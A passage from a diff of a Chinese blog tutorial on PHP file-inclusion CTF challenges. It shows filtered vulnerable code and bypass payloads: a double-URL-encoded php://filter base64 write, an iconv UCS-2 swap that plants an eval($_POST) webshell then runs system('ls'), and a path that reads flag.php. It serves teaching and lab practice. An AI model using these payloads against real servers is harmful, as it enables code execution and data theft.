class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先了解一下函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dirname() 函数返回路径中的目录部分。比如/tmp/sess_quan9i就返回/tmp/</span><br><span class="line">define() 函数定义一个常量。</span><br><span class="line">常量类似变量，不同之处在于：</span><br><span class="line">    在设定以后，常量的值无法更改</span><br><span class="line">    常量名不需要开头的美元符号 ($)</span><br><span class="line">    作用域不影响对常量的访问</span><br><span class="line">    常量值只能是字符串或数字</span><br><span class="line"> define(name,value,case_insensitive)</span><br><span class="line">参数              描述</span><br><span class="line">name                必需。规定常量的名称。</span><br><span class="line">value               必需。规定常量的值。</span><br><span class="line">case_insensitive    可选。规定常量的名称是否对大小写敏感。</span><br><span class="line">set_include_path简单理解的话就是给<span class="keyword">include</span>定义了一个路径</span><br></pre></td></tr></table></figure>
+<p>限制了include()的路径，但是并不影响上一题的payload，继续使用上一题的方法。</p>
+<p>原因如下：<br>平时include()文件的时候，PHP先会在当前目录下找找有没有这个路径，如果没有，然后就会在include paths里面找</p>
+<p>所谓的include paths不是一个目录，而是很多个目录，这些目录可以通过get_include_path();得到。</p>
+<h2><span id="文件包含绕死亡die">文件包含(绕死亡die())</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>本关我们先了解一下函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> file_put_contents ( <span class="keyword">string</span> <span class="variable">$filename</span> , <span class="keyword">mixed</span> <span class="variable">$data</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, resource <span class="variable">$context</span> ]] )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参数  描述</span><br><span class="line">file    必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</span><br><span class="line">data    必需。规定要写入文件的数据。可以是字符串、数组或数据流。</span><br><span class="line">mode    可选。规定如何打开/写入文件。可能的值：</span><br><span class="line"></span><br><span class="line">    FILE_USE_INCLUDE_PATH</span><br><span class="line">    FILE_APPEND</span><br><span class="line">    LOCK_EX</span><br><span class="line"></span><br><span class="line">context     可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</span><br></pre></td></tr></table></figure>
+<p>可以看出是对文件名进行了url编码，因此我们的file需要进行二次url编码，因为服务器还会自动解码一次，此时我们可以利用伪协议base64解码，来绕过死亡die，因为base64解码，只解码常规的0-9和A-Z已经/，所以识别的就是phpdie，我们在构造content时前面加上aa即可成功绕过（base64每四位一节）<br>,构造payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br><span class="line">解码两次后为php:<span class="comment">//filter/convert.base64-decode/resource=1.php</span></span><br><span class="line">content=aaPD9waHAgc3lzdGVtKCdscycpOz8+</span><br><span class="line">base64解码后为aa<span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/c5e4f1b785df4456b5c428a3eb36bfb1.png" alt="在这里插入图片描述"></p>
+<p>可能有部分师傅不知道去哪里进行url全编码，网上的工具大多数都未全编码，这里我使用的是bp。bp的decoder模块可以进行全编码<img src="https://img-blog.csdnimg.cn/6b4c93bc6ba840868ab9796782f190ba.png" alt="在这里插入图片描述"></p>
+<h2><span id="有趣的文件包含">有趣的文件包含</span></h2><h3><span id="0x01">0X01</span></h3><p>本关的话打开是个电影，我们抓包然后进行猜测，构造payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?file=<span class="keyword">var</span>/www/html/index.php</span><br></pre></td></tr></table></figure>
+<p>然后可以发现过滤规则</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="string">&quot;5.mp4&quot;</span>;</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">header(<span class="string">&#x27;Content-Type: video/mp4&#x27;</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Length: <span class="subst">$file</span>&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时我们修改变量，让他包含flag文件，那不就直接读取了吗，因为<code>readfile($file);</code>，所以构造payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?file=<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>
+<h3><span id="0x02">0X02</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>); </span><br></pre></td></tr></table></figure>
+<p>这关的话过滤了data64和rot13，但是还有很多，例如<code>convert.iconv.UCS-2LE.UCS-2BE</code>编码，这个编码就是将一部分内容进行交换位置，因此我们构造payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line">contents=?&lt;hp pvela$(P_SO[T]<span class="number">1</span>;)&gt;?</span><br></pre></td></tr></table></figure>
+<p>此时访问a.php，构造payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=system(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/3d9018875f1a418488c3af937b905458.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d137920438084804a6fd3804ecb5ef76.png" alt="在这里插入图片描述"></p>
+<p>参考文章<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/chalan630/p/14147602.html">https://www.cnblogs.com/chalan630/p/14147602.html</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9fff4501f56b">https://www.jianshu.com/p/9fff4501f56b</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/116205407">https://blog.csdn.net/miuzzx/article/details/116205407</a></p>
+
+      
+    </div>
+    
+    
+    
+     
+   <div>
+     <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:24px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+   </div>
+ 
+
+<div>
+      
+        
+      
+</div>
+
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt=" 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt=" 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+      
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    quan9i
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://quan9i.top/fileinclude/" title="浅析文件包含">https://quan9i.top/fileinclude/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"><i class="fa fa-tag"></i> 文件包含</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/websecurity2/" rel="next" title="web安全基础知识学习-part2">
+                <i class="fa fa-chevron-left"></i> web安全基础知识学习-part2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/websecurity3/" rel="prev" title="web安全基础知识学习-part3">
+                web安全基础知识学习-part3 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/2.jpeg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/%5Bobject%20Object%5D" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/Reme_mber" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-gg-circle"></i>CSDN</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://wpa.qq.com/msgrd?v=3&uin=1537969147&site=qq&menu=yes" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-qq"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/quan9i" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:shijishangjieke@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=0&id=7220329972&auto=0&height=430"></iframe>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">漏洞相关信息</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞常用函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">利用方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.1.</span> <span class="nav-text">无限制本地包含实战</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.2.</span> <span class="nav-text">有后缀的本地包含实战</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.3.</span> <span class="nav-text">文件包含实战(简单)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.3.1.</span> <span class="nav-text">0X01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.3.2.</span> <span class="nav-text">0X02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.3.3.</span> <span class="nav-text">0X03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.3.4.</span> <span class="nav-text">0X04</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.4.</span> <span class="nav-text">文件包含（日志包含类）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.4.1.</span> <span class="nav-text">0X01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.4.2.</span> <span class="nav-text">0X02</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.5.</span> <span class="nav-text">文件包含实战（条件竞争）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.5.1.</span> <span class="nav-text">0X01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.5.2.</span> <span class="nav-text">0X02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.5.3.</span> <span class="nav-text">0X03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.5.4.</span> <span class="nav-text">0X04</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.6.</span> <span class="nav-text">文件包含(绕死亡die())</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.7.</span> <span class="nav-text">有趣的文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.7.1.</span> <span class="nav-text">0X01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.7.2.</span> <span class="nav-text">0X02</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+
+
+  <div class="links-of-blogroll motion-element links-of-blogroll-block">
+    <div class="links-of-blogroll-title">
+      <!-- modify icon to fire by szw -->
+      <i class="fa fa-history fa-" aria-hidden="true"></i>
+      近期文章
+    </div>
+    <ul class="links-of-blogroll-list">
+      
+      
+        <li class="recent_posts_li">
+          <a href="/websecurity3/" title="web安全基础知识学习-part3" target="_blank">web安全基础知识学习-part3</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/fileinclude/" title="浅析文件包含" target="_blank">浅析文件包含</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/websecurity2/" title="web安全基础知识学习-part2" target="_blank">web安全基础知识学习-part2</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/websecurity1/" title="web安全基础知识学习-part1" target="_blank">web安全基础知识学习-part1</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/sqlzhuru/" title="浅析sql注入" target="_blank">浅析sql注入</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+
+
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">&copy; 2021-11 &mdash; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">quan9i</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">89.4k</span>
+  
+</div>
+
+
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("11/12/2021 12:49:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+
+
+
+
+
+
+
+
+
+
+        
+  
+-   <span class="site-uv" title="我的第 undefined 位朋友">
++   <span class="site-uv">
++     我的第 <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 位朋友
+-     <i class="fa fa-heart"></i>
+-     <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+-   <span class="site-pv" title="历经 undefined 次回眸才与你相遇">
++   <span class="site-pv">
++     历经 <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次回眸才与你相遇
+-     <i class="fa fa-heart"></i>
+-     <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+
+
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
